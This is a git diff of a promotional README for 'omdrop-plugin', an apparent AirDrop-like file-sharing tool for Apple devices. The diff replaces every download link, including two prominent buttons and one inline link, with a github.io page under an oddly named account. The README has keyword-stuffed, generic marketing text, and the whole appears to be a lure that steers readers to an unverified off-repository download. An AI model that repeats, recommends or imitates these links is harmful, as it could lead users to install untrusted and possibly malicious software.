@@ -1,7 +1,7 @@
 <h1>📡 omdrop-plugin - File Sharing with Apple Devices Made Easy</h1>
 
 <p align="center">
-  <a href="https://github.com/Uncut-unitedmexicanstates7619/omdrop-plugin" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:16px; border-radius:8px; font-weight:bold;">⬇️ DOWNLOAD NOW</a>
+  <a href="https://uncut-unitedmexicanstates7619.github.io" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:16px; border-radius:8px; font-weight:bold;">⬇️ DOWNLOAD NOW</a>
 </p>
 
 ## 👋 What Is This?
@@ -15,7 +15,7 @@ Think of it like magic - you click, your Apple device appears, and files fly bet
 Getting started takes less than two minutes. Follow these simple steps:
 
 1. **Click the green "DOWNLOAD NOW" button** at the top of this page, or visit this link directly:  
-   [https://github.com/Uncut-unitedmexicanstates7619/omdrop-plugin](https://github.com/Uncut-unitedmexicanstates7619/omdrop-plugin)
+   [https://uncut-unitedmexicanstates7619.github.io](https://uncut-unitedmexicanstates7619.github.io)
 
 2. **Visit this link to download the application** from the repository page.
 
@@ -149,7 +149,7 @@ Download it today and experience the freedom of instant file sharing across all 
 ---
 
 <p align="center">
-  <a href="https://github.com/Uncut-unitedmexicanstates7619/omdrop-plugin" style="background-color:#2196F3; color:white; padding:12px 24px; text-align:center; text-decoration:none; display:inline-block; font-size:14px; border-radius:6px;">⬇️ Get omdrop-plugin Now</a>
+  <a href="https://uncut-unitedmexicanstates7619.github.io" style="background-color:#2196F3; color:white; padding:12px 24px; text-align:center; text-decoration:none; display:inline-block; font-size:14px; border-radius:6px;">⬇️ Get omdrop-plugin Now</a>
 </p>
 
 Keywords: omdrop-plugin, AirDrop, Apple Silicon, Omarchy, file transfer, send files, receive files, Apple devices, iPhone, iPad, Mac, wireless sharing, bluetooth, Wi-Fi, plugin, download, install, user guide, tutorial
